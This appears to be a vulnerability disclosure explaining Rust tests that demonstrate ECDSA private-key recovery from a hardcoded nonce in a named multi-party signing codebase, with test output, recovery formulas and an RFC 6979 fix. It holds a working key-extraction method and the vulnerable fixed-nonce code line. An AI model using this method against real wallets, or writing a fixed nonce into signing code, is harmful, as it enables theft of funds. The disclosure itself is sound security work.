# ECDSA Nonce Reuse Attack - Test Case Explanation

## Overview

This document explains the test cases in `tests/nonce_reuse_attack_test.rs` that prove the hardcoded nonce vulnerability in the Qubetics Chain Abstraction codebase.

**Test File Location:** `tests/nonce_reuse_attack_test.rs`

**Run Command:**
```bash
cargo test --test nonce_reuse_attack_test -- --nocapture --test-threads=1
```

> **Note:** Use `--test-threads=1` to run tests sequentially for clear, readable output.

---

## Test Results Summary

```
test result: ok. 3 passed; 0 failed; 0 ignored
```

| Test Name | Purpose | Result |
|-----------|---------|--------|
| `test_1_nonce_reuse_attack_extracts_private_key` | Prove private key can be extracted from 2 signatures | ✅ PASSED |
| `test_2_nonce_is_hardcoded` | Prove nonce never changes (all r values identical) | ✅ PASSED |
| `test_3_secure_implementation_comparison` | Show how secure implementation behaves | ✅ PASSED |

---

## Complete Test Output

```
╔══════════════════════════════════════════════════════════════════╗
║           TEST 1: PRIVATE KEY EXTRACTION ATTACK                  ║
║   Proves that 2 signatures are enough to steal the private key   ║
╚══════════════════════════════════════════════════════════════════╝

[STEP 1] Setting up private key (simulating MPC network's key)
─────────────────────────────────────────────────────────────────
    Private Key: 0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01
    (This key controls all funds in the MPC wallet)

[STEP 2] Creating two different transactions
─────────────────────────────────────────────────────────────────
    Transaction 1: "Send 1 BTC to Alice - Transaction #12345"
    Hash (z1):     0x78a6f06b4c8f65a9d96972bc7c4c4f41594d08ec740d300d533f5bd53311c5f3

    Transaction 2: "Send 0.5 BTC to Bob - Transaction #67890"
    Hash (z2):     0xe62b261dcbb99054d50d72df1c5b49dd2c9739888dac5a93d018e4f43f6f5486

[STEP 3] Signing transactions with VULNERABLE function
─────────────────────────────────────────────────────────────────
    Using hardcoded nonce k = 0x424242...42 (from src/signing/mod.rs:261)

    Signature 1: (r1, s1)
      r1 = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
      s1 = 0xcd147d25cc4641aeb4fd63f2d904846984950cfbdf040617bf36b08cccae8855

    Signature 2: (r2, s2)
      r2 = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
      s2 = 0x1e32d076ab19563459eb5a368333ff69136e719399af25efe481611dc89c62a4

[STEP 4] CRITICAL OBSERVATION
═══════════════════════════════════════════════════════════════════
    Comparing r values from both signatures...

    ██████████████████████████████████████████████████████████████
    █                                                            █
    █   r1 == r2 ?  >>>  TRUE  <<<                               █
    █                                                            █
    █   THIS IS THE VULNERABILITY!                               █
    █   Same 'r' means same nonce 'k' was used!                  █
    █                                                            █
    ██████████████████████████████████████████████████████████████
═══════════════════════════════════════════════════════════════════

[STEP 5] EXECUTING ATTACK - Extracting private key
─────────────────────────────────────────────────────────────────
    Using formulas:
      k = (z1 - z2) / (s1 - s2) mod n
      private_key = (s1 * k - z1) / r mod n

    [+] Recovered nonce k: 0x4242424242424242424242424242424242424242424242424242424242424242

[STEP 6] ATTACK RESULT
═══════════════════════════════════════════════════════════════════
    Original Private Key:  0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01
    Recovered Private Key: 0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01

    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║   ███  KEYS MATCH: TRUE  ███                               ║
    ║                                                            ║
    ║   ATTACK SUCCESSFUL!                                       ║
    ║   Private key was extracted from just 2 signatures!        ║
    ║                                                            ║
    ║   An attacker can now:                                     ║
    ║   - Sign any transaction                                   ║
    ║   - Steal ALL funds from the wallet                        ║
    ║   - Completely compromise the MPC network                  ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════

[CONCLUSION]
─────────────────────────────────────────────────────────────────
    VULNERABILITY CONFIRMED!
    The hardcoded nonce in src/signing/mod.rs:261 allows
    complete private key extraction from just 2 signatures.
```

---

## Test 1: Private Key Extraction Attack

### What This Test Proves

This test demonstrates the complete attack chain:

1. **Two different messages are signed** (simulating two blockchain transactions)
2. **Both signatures have the SAME `r` value** because the nonce `k` is hardcoded
3. **Using simple math, the private key is recovered**

### Key Observations

| Observation | Value |
|-------------|-------|
| r1 (from signature 1) | `0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c` |
| r2 (from signature 2) | `0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c` |
| **r1 == r2 ?** | **TRUE** (This is the vulnerability!) |
| Recovered nonce k | `0x4242424242424242424242424242424242424242424242424242424242424242` |
| Private key recovered? | **YES - 100% match** |

### Attack Formulas Used

```
Step 1: Recover nonce k
    k = (z1 - z2) / (s1 - s2) mod n

Step 2: Recover private key
    private_key = (s1 * k - z1) / r mod n
```

---

## Test 2: Nonce is Hardcoded

### What This Test Proves

This test signs **4 completely different messages** and shows that ALL signatures have the **identical `r` value**.

### Output

```
╔══════════════════════════════════════════════════════════════════╗
║           TEST 2: NONCE IS HARDCODED (NEVER CHANGES)             ║
║   Proves that ALL signatures have the same 'r' value             ║
╚══════════════════════════════════════════════════════════════════╝

[STEP 1] Signing 4 different messages
─────────────────────────────────────────────────────────────────
    Message 1: "Transaction 1: Pay Alice"
      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
    Message 2: "Transaction 2: Pay Bob"
      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
    Message 3: "Transaction 3: Pay Charlie"
      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
    Message 4: "Transaction 4: Any other message"
      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c

    ██████████████████████████████████████████████████████████████
    █                                                            █
    █   ALL 4 SIGNATURES HAVE IDENTICAL 'r' VALUE!               █
    █                                                            █
    █   This proves k (nonce) NEVER changes!                     █
    █                                                            █
    ██████████████████████████████████████████████████████████████
```

### Why This Matters

- The `r` value in ECDSA comes from `R = k × G` (nonce times generator point)
- If `r` is always the same, then `k` is always the same
- This means ANY two signatures can be used to extract the private key

---

## Test 3: Secure Implementation Comparison

### What This Test Proves

This test shows how a **CORRECT** implementation (using RFC 6979) produces **DIFFERENT `r` values** for different messages.

### Output

```
╔══════════════════════════════════════════════════════════════════╗
║           TEST 3: SECURE IMPLEMENTATION (FOR COMPARISON)         ║
║   Shows how a CORRECT implementation behaves (different r's)     ║
╚══════════════════════════════════════════════════════════════════╝

[INFO] Using standard secp256k1 library with RFC 6979
       RFC 6979 generates UNIQUE nonce for each message
─────────────────────────────────────────────────────────────────
    Message 1: "Transaction 1: Pay Alice"
      r = 0x0864f29bd187092962b33279903130653604d29c696aace5dab03d2f618a7daa
    Message 2: "Transaction 2: Pay Bob"
      r = 0x12f86ac8f69e290491d86e6b8725b9e307cfc2738d0aae545d1bfca664235741

    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║   r1 != r2  >>>  TRUE  <<<                                 ║
    ║                                                            ║
    ║   DIFFERENT 'r' values = DIFFERENT nonces = SECURE!        ║
    ║                                                            ║
    ║   The nonce reuse attack is NOT possible here.             ║
    ║                                                            ║
    ╚════════════════════════════════════════════════════════════╝
```

### Comparison Table

| Aspect | Vulnerable Code | Secure Code (RFC 6979) |
|--------|-----------------|------------------------|
| r for Message 1 | `0x24653eac...` | `0x0864f29b...` |
| r for Message 2 | `0x24653eac...` (SAME!) | `0x12f86ac8...` (DIFFERENT!) |
| r1 == r2 ? | **TRUE** | **FALSE** |
| Attack possible? | **YES** | **NO** |

---

## Summary

### The Vulnerability

```rust
// src/signing/mod.rs:261
let k_bytes = [0x42u8; 32];  // HARDCODED NONCE - NEVER CHANGES!
```

### The Impact

| Question | Answer |
|----------|--------|
| How many signatures needed? | **Just 2** |
| What can attacker recover? | **Complete private key** |
| What can attacker do with it? | **Steal ALL funds** |
| Is special access required? | **No - signatures are public on blockchain** |

### The Fix

Replace hardcoded nonce with RFC 6979:

```rust
// VULNERABLE (current code):
let k_bytes = [0x42u8; 32];
let sig = manual_ecdsa_sign(&message, &private_key, &k_bytes);

// SECURE (recommended fix):
let sig = secp.sign_ecdsa(&message, &secret_key);  // Uses RFC 6979 internally
```

---

## How to Run

```bash
# Run all tests with clear sequential output
cargo test --test nonce_reuse_attack_test -- --nocapture --test-threads=1

# Run just the main attack test
cargo test --test nonce_reuse_attack_test test_1_nonce_reuse_attack_extracts_private_key -- --nocapture
```
